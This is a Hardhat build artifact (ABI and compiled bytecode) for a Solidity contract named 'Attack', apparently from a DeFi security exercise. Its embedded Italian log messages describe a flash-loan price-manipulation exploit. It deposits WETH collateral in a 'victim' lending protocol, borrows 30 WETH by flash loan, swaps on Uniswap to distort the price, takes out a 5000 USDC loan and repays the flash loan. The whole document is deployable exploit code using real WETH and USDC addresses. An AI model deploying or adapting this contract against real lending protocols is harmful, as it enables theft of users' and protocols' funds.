{
  "_format": "hh-sol-artifact-1",
  "contractName": "Attack",
  "sourceName": "contracts/attacco.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_pool",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "_router",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "_victim",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "asset",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "premium",
          "type": "uint256"
        },
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        },
        {
          "internalType": "bytes",
          "name": "",
          "type": "bytes"
        }
      ],
      "name": "executeOperation",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "pool",
      "outputs": [
        {
          "internalType": "contract IPool",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "uniswapRouter",
      "outputs": [
        {
          "internalType": "contract IUniswapV2Router02",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "victim",
      "outputs": [
        {
          "internalType": "contract ILendingProtocol",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "bytecode": "0x60e06040523480156200001157600080fd5b5060405162001b3c38038062001b3c833981810160405281019062000037919062000146565b8273ffffffffffffffffffffffffffffffffffffffff1660a08173ffffffffffffffffffffffffffffffffffffffff16815250508173ffffffffffffffffffffffffffffffffffffffff1660808173ffffffffffffffffffffffffffffffffffffffff16815250508073ffffffffffffffffffffffffffffffffffffffff1660c08173ffffffffffffffffffffffffffffffffffffffff1681525050505050620001a2565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006200010e82620000e1565b9050919050565b620001208162000101565b81146200012c57600080fd5b50565b600081519050620001408162000115565b92915050565b600080600060608486031215620001625762000161620000dc565b5b600062000172868287016200012f565b935050602062000185868287016200012f565b925050604062000198868287016200012f565b9150509250925092565b60805160a05160c051611924620002186000396000818161050a01528181610a6901528181610b3f0152610bc20152600081816101a3015281816101c90152818161098e0152610c9d0152600081816102940152818161041701528181610678015281816107fb0152610a4501526119246000f3fe60806040526004361061004e5760003560e01c806316f0115b146100d95780631b11d0ff14610104578063735de9f714610141578063930c20031461016c5780639e5faafc14610197576100d4565b366100d45760003411156100d25773c02aaa39b223fe8d0a0e5c4f27ead9083c756cc273ffffffffffffffffffffffffffffffffffffffff1663d0e30db0346040518263ffffffff1660e01b81526004016000604051808303818588803b1580156100b857600080fd5b505af11580156100cc573d6000803e3d6000fd5b50505050505b005b600080fd5b3480156100e557600080fd5b506100ee6101a1565b6040516100fb9190610ead565b60405180910390f35b34801561011057600080fd5b5061012b60048036038101906101269190610fb5565b6101c5565b604051610138919061106a565b60405180910390f35b34801561014d57600080fd5b50610156610a43565b60405161016391906110a6565b60405180910390f35b34801561017857600080fd5b50610181610a67565b60405161018e91906110e2565b60405180910390f35b61019f610a8b565b005b7f000000000000000000000000000000000000000000000000000000000000000081565b60007f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610255576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161024c9061115a565b60405180910390fd5b6102766040518060600160405280602b8152602001611843602b9139610d45565b8673ffffffffffffffffffffffffffffffffffffffff1663095ea7b37f0000000000000000000000000000000000000000000000000000000000000000886040518363ffffffff1660e01b81526004016102d1929190611198565b6020604051808303816000875af11580156102f0573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061031491906111ed565b506000600267ffffffffffffffff8111156103325761033161121a565b5b6040519080825280602002602001820160405280156103605781602001602082028036833780820191505090505b509050878160008151811061037857610377611249565b5b602002602001019073ffffffffffffffffffffffffffffffffffffffff16908173ffffffffffffffffffffffffffffffffffffffff168152505073a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48816001815181106103db576103da611249565b5b602002602001019073ffffffffffffffffffffffffffffffffffffffff16908173ffffffffffffffffffffffffffffffffffffffff16815250507f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff166338ed17398860008430426040518663ffffffff1660e01b8152600401610477959493929190611371565b6000604051808303816000875af1158015610496573d6000803e3d6000fd5b505050506040513d6000823e3d601f19601f820116820180604052508101906104bf9190611500565b506104fe6040518060400160405280601281526020017f5072657a7a6f206d616e69706f6c61746f2e0000000000000000000000000000815250610d45565b600064012a05f20090507f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663c5ebeaec826040518263ffffffff1660e01b81526004016105619190611549565b600060405180830381600087803b15801561057b57600080fd5b505af115801561058f573d6000803e3d6000fd5b505050506105b46040518060600160405280603681526020016118b960369139610d45565b600073a0b86991c6218b36c1d19d4a2e9eb0ce3606eb4873ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b81526004016106039190611564565b602060405180830381865afa158015610620573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610644919061157f565b905073a0b86991c6218b36c1d19d4a2e9eb0ce3606eb4873ffffffffffffffffffffffffffffffffffffffff1663095ea7b37f0000000000000000000000000000000000000000000000000000000000000000836040518363ffffffff1660e01b81526004016106b5929190611198565b6020604051808303816000875af11580156106d4573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906106f891906111ed565b506000600267ffffffffffffffff8111156107165761071561121a565b5b6040519080825280602002602001820160405280156107445781602001602082028036833780820191505090505b50905073a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48816000815181106107705761076f611249565b5b602002602001019073ffffffffffffffffffffffffffffffffffffffff16908173ffffffffffffffffffffffffffffffffffffffff16815250508a816001815181106107bf576107be611249565b5b602002602001019073ffffffffffffffffffffffffffffffffffffffff16908173ffffffffffffffffffffffffffffffffffffffff16815250507f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff166338ed17398360008430426040518663ffffffff1660e01b815260040161085b959493929190611371565b6000604051808303816000875af115801561087a573d6000803e3d6000fd5b505050506040513d6000823e3d601f19601f820116820180604052508101906108a39190611500565b506000898b6108b291906115db565b9050808c73ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b81526004016108ee9190611564565b602060405180830381865afa15801561090b573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061092f919061157f565b1015610970576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016109679061165b565b60405180910390fd5b8b73ffffffffffffffffffffffffffffffffffffffff1663095ea7b37f0000000000000000000000000000000000000000000000000000000000000000836040518363ffffffff1660e01b81526004016109cb929190611198565b6020604051808303816000875af11580156109ea573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610a0e91906111ed565b50610a3060405180606001604052806029815260200161189060299139610d45565b6001955050505050509695505050505050565b7f000000000000000000000000000000000000000000000000000000000000000081565b7f000000000000000000000000000000000000000000000000000000000000000081565b6000671bc16d674ec80000905073c02aaa39b223fe8d0a0e5c4f27ead9083c756cc273ffffffffffffffffffffffffffffffffffffffff1663d0e30db0826040518263ffffffff1660e01b81526004016000604051808303818588803b158015610af457600080fd5b505af1158015610b08573d6000803e3d6000fd5b505050505073c02aaa39b223fe8d0a0e5c4f27ead9083c756cc273ffffffffffffffffffffffffffffffffffffffff1663095ea7b37f0000000000000000000000000000000000000000000000000000000000000000836040518363ffffffff1660e01b8152600401610b7c929190611198565b6020604051808303816000875af1158015610b9b573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610bbf91906111ed565b507f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663b6b55f25826040518263ffffffff1660e01b8152600401610c199190611549565b600060405180830381600087803b158015610c3357600080fd5b505af1158015610c47573d6000803e3d6000fd5b50505050610c6c6040518060600160405280603a8152602001611809603a9139610d45565b60006801a055690d9db800009050610c9b60405180606001604052806022815260200161186e60229139610d45565b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff166342b0b77c3073c02aaa39b223fe8d0a0e5c4f27ead9083c756cc28460006040518563ffffffff1660e01b8152600401610d0f94939291906116f1565b600060405180830381600087803b158015610d2957600080fd5b505af1158015610d3d573d6000803e3d6000fd5b505050505050565b610ddb81604051602401610d5991906117b7565b6040516020818303038152906040527f41304fac000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff8381831617835250505050610dde565b50565b610df581610ded610df8610e19565b63ffffffff16565b50565b60006a636f6e736f6c652e6c6f679050600080835160208501845afa505050565b610e24819050919050565b610e2c6117d9565b565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b6000610e73610e6e610e6984610e2e565b610e4e565b610e2e565b9050919050565b6000610e8582610e58565b9050919050565b6000610e9782610e7a565b9050919050565b610ea781610e8c565b82525050565b6000602082019050610ec26000830184610e9e565b92915050565b6000604051905090565b600080fd5b600080fd5b6000610ee782610e2e565b9050919050565b610ef781610edc565b8114610f0257600080fd5b50565b600081359050610f1481610eee565b92915050565b6000819050919050565b610f2d81610f1a565b8114610f3857600080fd5b50565b600081359050610f4a81610f24565b92915050565b600080fd5b600080fd5b600080fd5b60008083601f840112610f7557610f74610f50565b5b8235905067ffffffffffffffff811115610f9257610f91610f55565b5b602083019150836001820283011115610fae57610fad610f5a565b5b9250929050565b60008060008060008060a08789031215610fd257610fd1610ed2565b5b6000610fe089828a01610f05565b9650506020610ff189828a01610f3b565b955050604061100289828a01610f3b565b945050606061101389828a01610f05565b935050608087013567ffffffffffffffff81111561103457611033610ed7565b5b61104089828a01610f5f565b92509250509295509295509295565b60008115159050919050565b6110648161104f565b82525050565b600060208201905061107f600083018461105b565b92915050565b600061109082610e7a565b9050919050565b6110a081611085565b82525050565b60006020820190506110bb6000830184611097565b92915050565b60006110cc82610e7a565b9050919050565b6110dc816110c1565b82525050565b60006020820190506110f760008301846110d3565b92915050565b600082825260208201905092915050565b7f436869616d617461206e6f6e206175746f72697a7a6174610000000000000000600082015250565b60006111446018836110fd565b915061114f8261110e565b602082019050919050565b6000602082019050818103600083015261117381611137565b9050919050565b61118381610edc565b82525050565b61119281610f1a565b82525050565b60006040820190506111ad600083018561117a565b6111ba6020830184611189565b9392505050565b6111ca8161104f565b81146111d557600080fd5b50565b6000815190506111e7816111c1565b92915050565b60006020828403121561120357611202610ed2565b5b6000611211848285016111d8565b91505092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b6000819050919050565b600061129d61129861129384611278565b610e4e565b610f1a565b9050919050565b6112ad81611282565b82525050565b600081519050919050565b600082825260208201905092915050565b6000819050602082019050919050565b6112e881610edc565b82525050565b60006112fa83836112df565b60208301905092915050565b6000602082019050919050565b600061131e826112b3565b61132881856112be565b9350611333836112cf565b8060005b8381101561136457815161134b88826112ee565b975061135683611306565b925050600181019050611337565b5085935050505092915050565b600060a0820190506113866000830188611189565b61139360208301876112a4565b81810360408301526113a58186611313565b90506113b4606083018561117a565b6113c16080830184611189565b9695505050505050565b6000601f19601f8301169050919050565b6113e5826113cb565b810181811067ffffffffffffffff821117156114045761140361121a565b5b80604052505050565b6000611417610ec8565b905061142382826113dc565b919050565b600067ffffffffffffffff8211156114435761144261121a565b5b602082029050602081019050919050565b60008151905061146381610f24565b92915050565b600061147c61147784611428565b61140d565b9050808382526020820190506020840283018581111561149f5761149e610f5a565b5b835b818110156114c857806114b48882611454565b8452602084019350506020810190506114a1565b5050509392505050565b600082601f8301126114e7576114e6610f50565b5b81516114f7848260208601611469565b91505092915050565b60006020828403121561151657611515610ed2565b5b600082015167ffffffffffffffff81111561153457611533610ed7565b5b611540848285016114d2565b91505092915050565b600060208201905061155e6000830184611189565b92915050565b6000602082019050611579600083018461117a565b92915050565b60006020828403121561159557611594610ed2565b5b60006115a384828501611454565b91505092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b60006115e682610f1a565b91506115f183610f1a565b9250828201905080821115611609576116086115ac565b5b92915050565b7f466f6e646920696e73756666696369656e746921000000000000000000000000600082015250565b60006116456014836110fd565b91506116508261160f565b602082019050919050565b6000602082019050818103600083015261167481611638565b9050919050565b600082825260208201905092915050565b50565b600061169c60008361167b565b91506116a78261168c565b600082019050919050565b600061ffff82169050919050565b60006116db6116d66116d184611278565b610e4e565b6116b2565b9050919050565b6116eb816116c0565b82525050565b600060a082019050611706600083018761117a565b611713602083018661117a565b6117206040830185611189565b81810360608301526117318161168f565b905061174060808301846116e2565b95945050505050565b600081519050919050565b60005b83811015611772578082015181840152602081019050611757565b60008484015250505050565b600061178982611749565b61179381856110fd565b93506117a3818560208601611754565b6117ac816113cb565b840191505092915050565b600060208201905081810360008301526117d1818461177e565b905092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052605160045260246000fdfe4465706f7369746174692032205745544820636f6d6520636f6c6c61746572616c65206e656c2070726f746f636f6c6c6f2076697474696d612e2d2d2d20466c617368204c6f616e20526963657675746f2c20496e697a696f204174746163636f202d2d2d52696368696573746120666c617368206c6f616e20646920333020574554482e2e2e2d2d2d204174746163636f20526975736369746f2c2044656269746f20526970616761746f202d2d2d4f7474656e7574692035303030205553444320696e20707265737469746f2064616c2070726f746f636f6c6c6f2076697474696d6121a2646970667358221220c3d5b8495f99ffbbb005cbc14e66972a06bbff6cd343921316287768755bfb2464736f6c63430008140033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}